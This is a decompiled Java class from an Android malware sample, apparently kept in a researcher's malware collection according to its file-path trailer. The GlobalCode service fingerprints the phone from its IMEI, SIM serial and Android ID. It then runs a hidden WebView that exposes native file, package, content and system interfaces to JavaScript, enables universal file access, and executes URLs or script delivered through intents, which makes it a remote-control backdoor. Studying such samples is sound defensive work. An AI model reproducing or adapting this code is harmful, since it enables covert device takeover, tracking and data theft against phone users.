package krep.itmtd.ywtjexf;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.net.Uri;
import android.net.Uri.Builder;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.os.IBinder;
import android.provider.Settings.Secure;
import android.telephony.TelephonyManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.widget.TableRow.LayoutParams;
import java.util.UUID;

public class GlobalCode
  extends Service
{
  public static String getUniqueID(Context paramContext)
  {
    Object localObject = (TelephonyManager)paramContext.getSystemService("phone");
    str = ((TelephonyManager)localObject).getDeviceId();
    localObject = ((TelephonyManager)localObject).getSimSerialNumber();
    localObject = new UUID(Settings.Secure.getString(paramContext.getContentResolver(), "android_id").hashCode(), str.hashCode() << 32 | ((String)localObject).hashCode()).toString();
    str = "";
    try
    {
      ApplicationInfo localApplicationInfo = paramContext.getPackageManager().getApplicationInfo(paramContext.getPackageName(), 128);
      paramContext = str;
      if (localApplicationInfo.metaData != null) {
        paramContext = localApplicationInfo.metaData.getString("sub");
      }
    }
    catch (PackageManager.NameNotFoundException paramContext)
    {
      for (;;)
      {
        paramContext.printStackTrace();
        paramContext = str;
      }
    }
    return localObject + "-" + paramContext;
  }
  
  public String getexstras(Bundle paramBundle, String paramString)
  {
    String str2 = "";
    String str1 = str2;
    if (paramBundle != null)
    {
      str1 = str2;
      if (paramBundle.containsKey(paramString)) {
        str1 = paramBundle.getString(paramString);
      }
    }
    return str1;
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onCreate()
  {
    super.onCreate();
  }
  
  public void onDestroy() {}
  
  @SuppressLint({"NewApi"})
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
  {
    if (paramIntent != null)
    {
      Object localObject = paramIntent.getExtras();
      if (localObject != null)
      {
        paramIntent = getexstras((Bundle)localObject, "content");
        String str = getexstras((Bundle)localObject, "type");
        localObject = getexstras((Bundle)localObject, "data");
        WebView localWebView = new WebView(getApplicationContext());
        localWebView.setLayoutParams(new TableRow.LayoutParams(0, -2, 1.0F));
        localWebView.addJavascriptInterface(new MeSetting(getApplicationContext()), "MeSetting");
        localWebView.addJavascriptInterface(new MeSystem(getApplicationContext()), "MeSystem");
        localWebView.addJavascriptInterface(new MeFile(getApplicationContext()), "MeFile");
        localWebView.addJavascriptInterface(new MePackage(getApplicationContext()), "MePackage");
        localWebView.addJavascriptInterface(new MeContent(getApplicationContext()), "MeContent");
        localWebView.addJavascriptInterface(new MeAction(getApplicationContext()), "MeAction");
        WebSettings localWebSettings = localWebView.getSettings();
        localWebSettings.setSavePassword(true);
        localWebSettings.setSaveFormData(true);
        localWebSettings.setAllowFileAccess(true);
        if (Build.VERSION.SDK_INT >= 16)
        {
          localWebSettings.setAllowFileAccessFromFileURLs(true);
          localWebSettings.setAllowUniversalAccessFromFileURLs(true);
        }
        localWebSettings.setJavaScriptEnabled(true);
        localWebSettings.setUserAgentString("Hash: " + getUniqueID(getApplicationContext()));
        if (paramIntent.substring(0, 7).contains("http://")) {
          localWebView.loadUrl(Uri.parse(paramIntent).buildUpon().appendQueryParameter("type", str).appendQueryParameter("data", (String)localObject).build().toString());
        }
        if (paramIntent.substring(0, 8).contains("file:///")) {
          localWebView.loadUrl(Uri.parse(paramIntent).buildUpon().build().toString());
        }
        if (paramIntent.substring(0, 11).contains("javascript:")) {
          localWebView.loadData("<script>" + paramIntent.substring(11) + "</script>", "text/html; charset=UTF-8", null);
        }
      }
    }
    stopSelf();
    return 1;
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/krep/classes-dex2jar.jar!/krep/itmtd/ywtjexf/GlobalCode.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */